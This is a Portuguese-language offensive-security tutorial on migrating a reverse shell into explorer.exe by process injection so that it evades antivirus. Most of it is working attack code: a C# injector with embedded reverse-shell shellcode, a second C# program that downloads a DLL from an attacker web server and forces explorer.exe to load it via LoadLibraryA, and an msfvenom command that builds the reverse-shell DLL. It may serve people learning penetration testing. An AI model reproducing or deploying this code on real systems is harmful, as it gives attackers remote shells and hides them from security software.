# Migração ou Injeção de Processo

* Quando obtermos o shell reverso de uma aplicação podem ocorrer algums situações inesperadas como: 
  * A vítima fechar o processo no qual iniciamos nosso shell reverso
  * O antivirus bloquear o acesso de um processo desconhecido à internet
* Dessa forma, ao migrar nosso shell reverso de um processo desconhecido, para um conhecido de mesmo privilégio como o "explorer.exe", toda a comunicação dele com a internet fica "um pouco mais legítimo"
* Só é possível abrir um outro processo para se comunicar que possua o mesmo "nível de integridade" do que o usuário que solicitou o acesso

## Explicação das API's que serão utilizadas

```c
// Função que abre um canal de comunicação com outro processo
HANDLE OpenProcess(
	
	// Argumento que verifica o nível de acesso pedido ao processo
	// Para a injeção, será pedido o acesso PROCESS_ALL_ACCESS com a representação hexadecimal 0x001F0FFF
	DWORD dwDesiredAccess,
	// Esse argumento pergunta se o processo aberto irá herdar as mesmas permissões
	BOOL bInheritHandle,
	// O PID do processo em que queremos abrir a comunicação
	DWORD dwProcessId
);

// Função aloca espaço na memória de outro aplicativo
LPVOID VirtualAllocEx(
	// O valor que será usado é o retorno da função "OpenProcess"
	HANDLE hProcess,
	// Esse parâmetro serve para indicar o inicio do endereço em que a memória será alocada
	// para evitar erros vamos passar o valor nulo para deixar a API escolher esse endereço automaticamente
	LPVOID lpAddress,
	// Tamanho do espaço que será reservado
	SIZE_T dwSize,
	// Os tipos de atributos que queremos ao alocar o espaço
	// Serão utilizados MEM_COMMIT e MEM_RESERVE (0x1000 e 0x2000)
	DWORD flAllocationType, // 0x1000 | 0x2000 => 0x3000
	// O tipo de proteção utilizada será PAGE_EXECUTE_READWRITE representada pelo valor 0x40
	DWORD flProtect
);

// Função para escrever dentro de um espaço de memória de um processo aberto pela função "OpenProcess"
BOOL WriteProcessMemory(
	// O valor que será usado é o retorno da função "OpenProcess"
	HANDLE hProcess,
	// O valor que será usado é o retorno da função "VirtualAllocEx"
	LPVOID lpBaseAddress,
	// O buffer contendo o shellcode
	LPCVOID lpBuffer,
	// O tamanho do shellcode
	SIZE_T nSize,
	// Um ponteiro para receber quanto de espaço foi escrito durante a função
	SIZE_T *lpNumberOfBytesWritten
);

// Função para criar um thread utilizando o espaço de memória que foi alocado como endereço base
HANDLE CreateRemoteThread(
	// O valor que será usado é o retorno da função "OpenProcess"
	HANDLE hProcess,
	// Atributos para a nova thread criada, será utilizado 0 para aceitar os valores padrões
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	// Atributos para o tamanho da pilha, será utilizado 0 para aceitar os valores padrões
	SIZE_T dwStackSize,
	// O valor que será usado é o retorno da função "VirtualAllocEx"
	LPTHREAD_START_ROUTINE lpStartAddress,
	// Um ponteiro que receber os parâmtros que serão passados para a função
	// como não tem nenhum parâmetro, esse argumento será 0
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	// Ponteiro que recebe o PID da thread criada, como isso não tem importância agora, será passado 0
	LPDWORD lpThreadId
);
```

## Injeção do shellcode em outro processo

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        static void Main(string[] args)
        {
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
            0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
            0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x04,0xd2,
            0xc0,0xa8,0x00,0x7d,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
            0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
            0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
            0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
            0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
            0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
            0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
            0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
            0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
            0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
            0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
            0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
            0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
            0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
            0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
            0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
            0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
            0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};


            IntPtr outSize;

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

    }
}
```
## Injecção de DLL

* Código em CSharp

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace InjectDLL
{
    class Program

    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)

        {
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\chucrutis.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.1.16:1235/chucrutis.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;

            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }

    }
}
```

* Criando a dll com o msfvenom

```
[root@chucrutis /tmp] ➜ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.16 LPORT=1234 -f dll -o chucrutis.dll
```

* Após a execução do programa, ele baixa a DLL do servidor Web e faz o programa alvo carregar essa DLL na memória